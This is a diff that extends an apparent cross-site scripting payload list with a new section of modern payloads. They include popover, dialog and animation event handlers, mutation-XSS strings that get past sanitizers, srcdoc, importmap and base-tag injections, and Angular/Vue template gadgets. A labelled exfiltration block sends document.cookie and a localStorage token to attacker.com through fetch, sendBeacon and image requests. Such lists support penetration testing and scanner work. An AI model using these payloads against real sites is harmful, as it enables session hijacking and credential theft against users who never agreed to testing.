@@ -495,3 +495,38 @@ v-html="'<img src=x onerror=alert(1)>'"
 \";<script>alert(1)</script>
 \");alert(1);//
 "}alert(1)//
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# popover / dialog / yeni event sink'leri (Chrome 114+ / 2023-2024)
+<button popovertarget=p>x</button><div popover id=p onbeforetoggle=alert(1)>x</div>
+<div popover id=p onbeforetoggle=alert(1)></div><button popovertarget=p>x
+<dialog open onclose=alert(1)><form method=dialog><button>x</button></form></dialog>
+<input autofocus onfocusin=alert(1)>
+<select autofocus onfocusin=alert(1)><option>x
+<textarea autofocus onfocusin=alert(1)>x
+<audio src/onerror=alert(1)>
+<svg><set attributeName=x onbegin=alert(1)>
+<marquee onstart=alert(1)>x
+<style>@keyframes a{}</style><xss style="animation-name:a" onanimationstart="alert(1)"></xss>
+<xss style="animation-name:a" onanimationend="alert(1)"></xss>
+# mutation XSS / sanitizer bypass (DOMPurify-style namespace confusion)
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<template><s>x</s></template><svg><foreignobject><img src=x onerror=alert(1)>
+<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
+# srcdoc / import map / base / meta (2024 sink'ler)
+<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">
+<base href=//attacker.com/>
+<script type=importmap>{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type=module>import "x"</script>
+# data exfil PoC (çerez/oturum)
+"><script>fetch('//attacker.com/?c='+document.cookie)</script>
+"><script>navigator.sendBeacon('//attacker.com',document.cookie)</script>
+<img src=x onerror="this.src='//attacker.com/?'+document.cookie">
+<img src=x onerror="new Image().src='//attacker.com/?'+localStorage.getItem('token')">
+# encoding / case / template-literal varyantları
+'-alert(document.domain)-'
+<sCrIpT>alert(1)</sCrIpT>
+<svg><script>alert&lpar;1&rpar;</script>
+# framework gadget'leri (Angular/Vue CSP bypass)
+{{$eval.constructor('alert(1)')()}}
+{{_openBlock.constructor('alert(1)')()}}
+{{$emit.constructor('alert(1)')()}}
